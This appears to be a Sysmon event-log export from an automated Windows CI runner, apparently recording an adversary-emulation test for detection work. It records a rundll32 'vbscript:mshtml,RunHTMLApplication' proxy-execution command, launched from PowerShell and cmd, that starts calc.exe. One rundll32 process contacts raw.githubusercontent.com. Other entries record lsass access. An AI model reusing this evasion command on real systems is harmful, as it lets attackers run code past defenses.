"12/17/2025 8:09:33 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:09:33.371
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-653d-6942-9406-000000000e00}
TargetProcessId: 6744
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:09:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:09:33.371
ProcessGuid: {f995aebf-653d-6942-9406-000000000e00}
ProcessId: 6744
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c rundll32 vbscript:""\..\mshtml,#135 ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:09:33 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:09:33.186
SourceProcessGUID: {f995aebf-5ff2-6942-1200-000000000e00}
SourceProcessId: 1148
SourceThreadId: 6240
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+f406|c:\windows\system32\lsm.dll+ee2d|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:09:33 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:09:33.186
SourceProcessGUID: {f995aebf-5ff2-6942-1200-000000000e00}
SourceProcessId: 1148
SourceThreadId: 6240
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+ed09|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:09:33 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:09:33.006
SourceProcessGUID: {f995aebf-64b8-6942-7006-000000000e00}
SourceProcessId: 9164
SourceThreadId: 8048
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:09:32 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:09:32.948
SourceProcessGUID: {f995aebf-64b8-6942-7006-000000000e00}
SourceProcessId: 9164
SourceThreadId: 8048
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:09:32 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:09:32.875
SourceProcessGUID: {f995aebf-64b8-6942-7006-000000000e00}
SourceProcessId: 9164
SourceThreadId: 8048
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:09:32 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:09:32.813
SourceProcessGUID: {f995aebf-64b8-6942-7006-000000000e00}
SourceProcessId: 9164
SourceThreadId: 8048
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:09:32 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:09:32.750
SourceProcessGUID: {f995aebf-64b8-6942-7006-000000000e00}
SourceProcessId: 9164
SourceThreadId: 8048
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:09:32 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:09:32.692
SourceProcessGUID: {f995aebf-64b8-6942-7006-000000000e00}
SourceProcessId: 9164
SourceThreadId: 8048
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+d626|C:\Windows\system32\wbem\wmiprvse.exe+8ca9|C:\Windows\system32\wbem\wmiprvse.exe+8338|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:09:32 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:09:32.672
SourceProcessGUID: {f995aebf-5ff2-6942-1200-000000000e00}
SourceProcessId: 1148
SourceThreadId: 6240
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+f406|c:\windows\system32\lsm.dll+ee2d|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:09:32 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:09:32.672
SourceProcessGUID: {f995aebf-5ff2-6942-1200-000000000e00}
SourceProcessId: 1148
SourceThreadId: 6240
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+ed09|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:08:42 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:08:42.326
SourceProcessGUID: {f995aebf-64fe-6942-8f06-000000000e00}
SourceProcessId: 2660
SourceThreadId: 10020
SourceImage: C:\Windows\system32\compattelrunner.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\SYSTEM32\aeinv.dll+22b55|C:\Windows\SYSTEM32\aeinv.dll+39fa3|C:\Windows\SYSTEM32\aeinv.dll+74d22|C:\Windows\SYSTEM32\aeinv.dll+48f80|C:\Windows\SYSTEM32\aeinv.dll+53228|C:\Windows\SYSTEM32\aeinv.dll+5365c|C:\Windows\system32\compattelrunner.exe+b57e|C:\Windows\system32\compattelrunner.exe+c7fb|C:\Windows\system32\compattelrunner.exe+1f5b|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:08:12 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:08:12.024
SourceProcessGUID: {f995aebf-5ff2-6942-1200-000000000e00}
SourceProcessId: 1148
SourceThreadId: 6240
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+f406|c:\windows\system32\lsm.dll+ee2d|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:08:12 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:08:12.024
SourceProcessGUID: {f995aebf-5ff2-6942-1200-000000000e00}
SourceProcessId: 1148
SourceThreadId: 6240
SourceImage: C:\Windows\system32\svchost.exe
TargetProcessGUID: {f995aebf-5ff1-6942-0d00-000000000e00}
TargetProcessId: 992
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1000
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+c464b|c:\windows\system32\lsm.dll+ed09|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+d570e|C:\Windows\System32\RPCRT4.dll+8a1ec|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+52ac8|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c|C:\Windows\System32\RPCRT4.dll+5601c|C:\Windows\System32\RPCRT4.dll+551a3|C:\Windows\System32\RPCRT4.dll+54148|C:\Windows\SYSTEM32\ntdll.dll+77ffe|C:\Windows\SYSTEM32\ntdll.dll+76123|C:\Windows\System32\KERNEL32.DLL+2e8d7|C:\Windows\SYSTEM32\ntdll.dll+8c53c
SourceUser: NT AUTHORITY\SYSTEM
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:07:34 AM","22","Dns query:
RuleName: -
UtcTime: 2025-12-17 08:07:32.205
ProcessGuid: {f995aebf-64c4-6942-8206-000000000e00}
ProcessId: 1228
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\rundll32.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:33 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 08:07:32.209
ProcessGuid: {f995aebf-64c4-6942-8206-000000000e00}
ProcessId: 1228
Image: C:\Windows\System32\rundll32.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.118
SourceHostname: runnervm8j6r3.e3zk2pzlrrleboh20n41ic2nra.bx.internal.cloudapp.net
SourcePort: 61016
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 8:07:32 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:07:32.786
ProcessGuid: {f995aebf-64c4-6942-8606-000000000e00}
ProcessId: 5604
Image: C:\Windows\System32\rundll32.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpClient.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: Client Interface
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA256=F1CA293E6D05A500EB026529A27948B01B6467D0E9C20C6049101C2B2829B96A
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:32 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:07:32.763
ProcessGuid: {f995aebf-64c4-6942-8606-000000000e00}
ProcessId: 5604
Image: C:\Windows\System32\rundll32.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:07:32.685
ProcessGuid: {f995aebf-64c4-6942-8606-000000000e00}
ProcessId: 5604
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32  vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=2F2321D2A3EEEC2CDD7D921645C121BED75872435926EE97F3D53E7EE7662BF0
ParentProcessGuid: {f995aebf-64c4-6942-8406-000000000e00}
ParentProcessId: 6752
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:32 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:07:32.660
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-64c4-6942-8406-000000000e00}
TargetProcessId: 6752
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:32 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:07:32.659
ProcessGuid: {f995aebf-64c4-6942-8406-000000000e00}
ProcessId: 6752
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c rundll32 vbscript:""\..\mshtml,RunHTMLApplication ""+String(CreateObject(""WScript.Shell"").Run(""calc.exe""),0)
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:07:32 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:07:32.257
ProcessGuid: {f995aebf-64c4-6942-8206-000000000e00}
ProcessId: 1228
Image: C:\Windows\System32\rundll32.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpClient.dll
